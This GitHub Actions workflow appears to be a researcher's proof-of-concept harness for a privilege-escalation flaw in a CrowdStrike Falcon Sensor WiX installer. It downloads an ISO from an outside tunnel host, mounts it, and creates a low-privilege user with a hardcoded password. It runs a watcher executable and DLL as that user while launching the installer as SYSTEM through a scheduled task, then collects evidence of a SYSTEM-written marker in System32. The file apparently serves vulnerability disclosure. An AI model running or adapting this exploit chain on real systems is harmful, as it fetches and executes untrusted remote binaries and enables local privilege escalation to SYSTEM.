name: exact-current-wix-safe-proof
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  proof:
    runs-on: windows-2022
    timeout-minutes: 20
    steps:
      - name: Download exact researcher-hosted proof ISO
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $u = 'http://ueqey-2600-1f18-68f7-2200-4028-a0ee-80f3-3d13.run.pinggy-free.link:38591/falcon-wix-poc.iso'
          Invoke-WebRequest -Uri $u -OutFile "$env:RUNNER_TEMP\falcon-wix-poc.iso"
          $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc.iso" -Algorithm SHA256).Hash.ToLower()
          Write-Host "ISO SHA256=$h"
          if ($h -ne '0a51ebd4eb630faa3c135eadbfc5e96de2f79f7a88f2c9a6ed74780b169edc0e') { throw 'ISO hash mismatch' }
          $img=Mount-DiskImage -ImagePath "$env:RUNNER_TEMP\falcon-wix-poc.iso" -PassThru
          $drive=(Get-Volume -DiskImage $img).DriveLetter
          if (-not $drive) { throw 'No mounted drive' }
          "POC_DRIVE=$drive" | Out-File -FilePath $env:GITHUB_ENV -Append
          Write-Host "Mounted $drive`:"
      - name: Run low-privilege watcher and exact installer as SYSTEM
        shell: pwsh
        run: |
          $ErrorActionPreference='Stop'
          New-Item -ItemType Directory -Force C:\poc\readonly,C:\poc\results | Out-Null
          Copy-Item "$env:POC_DRIVE`:\watcher.exe" C:\poc\readonly\watcher.exe -Force
          Copy-Item "$env:POC_DRIVE`:\fgba.dll" C:\poc\readonly\fgba.dll -Force
          Copy-Item "$env:POC_DRIVE`:\FalconSensor_Windows_7.40.21306_GovLaggar.exe" C:\poc\readonly\FalconSensor.exe -Force
          cmd /c 'icacls C:\poc /inheritance:r /grant:r SYSTEM:(OI)(CI)F Administrators:(OI)(CI)F Users:(OI)(CI)RX'
          cmd /c 'icacls C:\poc\results /grant:r Users:(OI)(CI)M'
          $pw='Burn-PoC-2026!'
          net user burnlow $pw /add
          $secure=ConvertTo-SecureString $pw -AsPlainText -Force
          $cred=[pscredential]::new("$env:COMPUTERNAME\burnlow",$secure)
          $low=Start-Process -FilePath 'C:\poc\readonly\watcher.exe' -ArgumentList 'C:\poc\readonly\fgba.dll' -Credential $cred -WindowStyle Hidden -PassThru
          Write-Host "Started low watcher PID=$($low.Id)"
          Start-Sleep -Seconds 3
          $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
          $sysAction=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c "set > C:\poc\results\system-env.txt & C:\poc\readonly\FalconSensor.exe /help"'
          Register-ScheduledTask -TaskName BurnSystemInstaller -Action $sysAction -Trigger $trigger -User 'SYSTEM' -RunLevel Highest -Force | Out-Null
          Start-ScheduledTask -TaskName BurnSystemInstaller
          Start-Sleep -Seconds 75
          exit 0
      - name: Collect proof
        if: always()
        shell: pwsh
        run: |
          $ErrorActionPreference='Continue'
          $out="$env:RUNNER_TEMP\proof-summary.txt"
          "=== $(Get-Date -Format o) ===" | Set-Content $out
          "--- runner ---" | Add-Content $out
          whoami /all | Add-Content $out
          "--- burnlow ---" | Add-Content $out
          cmd /c 'net user burnlow' | Add-Content $out
          "--- tasks ---" | Add-Content $out
          schtasks /query /tn BurnSystemInstaller /v /fo list | Add-Content $out
          "--- SYSTEM environment ---" | Add-Content $out
          if (Test-Path C:\poc\results\system-env.txt) { Get-Content C:\poc\results\system-env.txt | Add-Content $out; Copy-Item C:\poc\results\system-env.txt "$env:RUNNER_TEMP\system-env.txt" -Force }
          "--- SYSTEM temp roots ---" | Add-Content $out
          foreach ($tempRoot in @('C:\Windows\Temp','C:\Windows\SystemTemp','C:\Windows\System32\config\systemprofile\AppData\Local\Temp')) {
            "ROOT=$tempRoot" | Add-Content $out
            cmd /c "icacls $tempRoot" | Add-Content $out
            Get-ChildItem -Force $tempRoot -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 30 Name,Length,CreationTime,LastWriteTime | Format-Table -AutoSize | Out-String | Add-Content $out
          }
          "--- protected input ACL and hash ---" | Add-Content $out
          icacls C:\poc\readonly\FalconSensor.exe | Add-Content $out
          Get-FileHash C:\poc\readonly\FalconSensor.exe -Algorithm SHA256 | Format-List | Out-String | Add-Content $out
          "--- low watcher log ---" | Add-Content $out
          if (Test-Path C:\poc\results\watcher.log) { Get-Content C:\poc\results\watcher.log | Add-Content $out; Copy-Item C:\poc\results\watcher.log "$env:RUNNER_TEMP\watcher.log" -Force }
          "--- SYSTEM marker ---" | Add-Content $out
          if (Test-Path C:\Windows\System32\CrowdStrike_WiX_SYSTEM_proof.txt) { Get-Content C:\Windows\System32\CrowdStrike_WiX_SYSTEM_proof.txt | Add-Content $out; Get-Acl C:\Windows\System32\CrowdStrike_WiX_SYSTEM_proof.txt | Format-List | Out-String | Add-Content $out } else { 'MARKER ABSENT' | Add-Content $out }
          Get-Content $out
      - name: Upload proof artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: exact-current-wix-proof
          path: |
            ${{ runner.temp }}/proof-summary.txt
            ${{ runner.temp }}/watcher.log
            ${{ runner.temp }}/system-env.txt
          if-no-files-found: warn
      - name: Cleanup
        if: always()
        shell: pwsh
        run: |
          Stop-Process -Name watcher -Force -ErrorAction SilentlyContinue
          Stop-Process -Name FalconSensor -Force -ErrorAction SilentlyContinue
          Unregister-ScheduledTask -TaskName BurnLowWatcher -Confirm:$false -ErrorAction SilentlyContinue
          Unregister-ScheduledTask -TaskName BurnSystemInstaller -Confirm:$false -ErrorAction SilentlyContinue
          Remove-Item C:\Windows\System32\CrowdStrike_WiX_SYSTEM_proof.txt -Force -ErrorAction SilentlyContinue
          Remove-LocalUser burnlow -ErrorAction SilentlyContinue
